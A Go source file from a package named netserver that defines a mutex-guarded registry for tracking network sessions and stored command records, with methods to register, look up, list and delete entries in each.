package netserver

import (
	"fmt"
	"sync"

	"github.com/codevault-llc/xenomorph/pkg/types"
)

type Registry struct {
	sync.RWMutex
	sessions map[string]*Session
	commands map[string]types.CommandData
}

func NewRegistry() *Registry {
	return &Registry{
		sessions: make(map[string]*Session),
		commands: make(map[string]types.CommandData), // initialize commands map
	}
}

func (r *Registry) Register(s *Session) {
	r.Lock()
	defer r.Unlock()
	r.sessions[s.ID] = s
}

func (r *Registry) Unregister(id string) {
	r.Lock()
	defer r.Unlock()
	delete(r.sessions, id)
}

func (r *Registry) Update(s *Session) {
	r.Lock()
	defer r.Unlock()
	if _, exists := r.sessions[s.ID]; exists {
		r.sessions[s.ID] = s
	}
}

func (r *Registry) Get(id string) (*types.SessionController, error) {
	r.RLock()
	defer r.RUnlock()

	s, exists := r.sessions[id]
	if !exists {
		return nil, fmt.Errorf("session with ID %s not found", id)
	}

	var controller types.SessionController = s
	return &controller, nil
}

func (r *Registry) List() []*Session {
	r.RLock()
	defer r.RUnlock()
	sessions := make([]*Session, 0, len(r.sessions))
	for _, s := range r.sessions {
		sessions = append(sessions, s)
	}
	return sessions
}

func (r *Registry) Count() int {
	r.RLock()
	defer r.RUnlock()
	return len(r.sessions)
}

func (r *Registry) StoreCommand(id string, cmd types.CommandData) {
	r.Lock()
	defer r.Unlock()
	r.commands[id] = cmd
}

func (r *Registry) GetCommand(id string) (types.CommandData, error) {
	r.RLock()
	defer r.RUnlock()
	cmd, exists := r.commands[id]
	if !exists {
		return types.CommandData{}, fmt.Errorf("command with ID %s not found", id)
	}
	return cmd, nil
}

func (r *Registry) ListCommands() []types.CommandData {
	r.RLock()
	defer r.RUnlock()
	cmds := make([]types.CommandData, 0, len(r.commands))
	for _, cmd := range r.commands {
		cmds = append(cmds, cmd)
	}
	return cmds
}

func (r *Registry) DeleteCommand(id string) {
	r.Lock()
	defer r.Unlock()
	delete(r.commands, id)
}
